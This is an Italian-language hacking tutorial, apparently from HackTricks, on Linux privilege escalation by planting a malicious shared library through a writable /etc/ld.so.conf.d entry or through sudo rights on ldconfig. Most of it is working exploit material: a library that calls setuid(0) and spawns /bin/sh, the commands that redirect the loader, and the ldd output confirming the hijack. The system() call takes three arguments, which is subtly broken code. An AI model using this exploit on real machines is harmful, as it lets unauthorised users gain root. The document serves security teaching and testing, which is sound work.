# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Preparare l'ambiente

Nella sezione seguente puoi trovare il codice dei file che useremo per preparare l'ambiente

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crea** quei file nella tua macchina nella stessa cartella
2. **Compila** la **libreria**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` in `/usr/lib`: `sudo cp libcustom.so /usr/lib` (privilegi di root)
4. **Compila** l'**eseguibile**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Controlla l'ambiente

Controlla che _libcustom.so_ venga **caricato** da _/usr/lib_ e che tu possa **eseguire** il binario.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

In questo scenario supponiamo che **qualcuno abbia creato un'entrata vulnerabile** all'interno di un file in _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
La cartella vulnerabile è _/home/ubuntu/lib_ (dove abbiamo accesso in scrittura).\
**Scarica e compila** il seguente codice all'interno di quel percorso:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Ora che abbiamo **creato la libreria maligna libcustom all'interno del percorso mal configurato**, dobbiamo aspettare un **riavvio** o che l'utente root esegua **`ldconfig`** (_nel caso tu possa eseguire questo binario come **sudo** o abbia il **suid bit** potrai eseguirlo tu stesso_).

Una volta che ciò è accaduto, **ricontrolla** da dove l'eseguibile `sharevuln` sta caricando la libreria `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Come puoi vedere, sta **caricando da `/home/ubuntu/lib`** e se un utente lo esegue, verrà eseguita una shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!NOTE]
> Nota che in questo esempio non abbiamo elevato i privilegi, ma modificando i comandi eseguiti e **aspettando che l'utente root o un altro utente privilegiato esegua il binario vulnerabile** saremo in grado di elevare i privilegi.

### Altre misconfigurazioni - Stessa vulnerabilità

Nell'esempio precedente abbiamo simulato una misconfigurazione in cui un amministratore **ha impostato una cartella non privilegiata all'interno di un file di configurazione in `/etc/ld.so.conf.d/`**.\
Ma ci sono altre misconfigurazioni che possono causare la stessa vulnerabilità; se hai **permessi di scrittura** in qualche **file di configurazione** all'interno di `/etc/ld.so.conf.d`, nella cartella `/etc/ld.so.conf.d` o nel file `/etc/ld.so.conf`, puoi configurare la stessa vulnerabilità e sfruttarla.

## Exploit 2

**Supponi di avere privilegi sudo su `ldconfig`**.\
Puoi indicare a `ldconfig` **da dove caricare i file di configurazione**, quindi possiamo approfittarne per far caricare a `ldconfig` cartelle arbitrarie.\
Quindi, creiamo i file e le cartelle necessari per caricare "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ora, come indicato nel **precedente exploit**, **crea la libreria malevola all'interno di `/tmp`**.\
E infine, carichiamo il percorso e verifichiamo da dove il binario sta caricando la libreria:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Come puoi vedere, avere privilegi sudo su `ldconfig` ti consente di sfruttare la stessa vulnerabilità.**

{{#include ../../banners/hacktricks-training.md}}
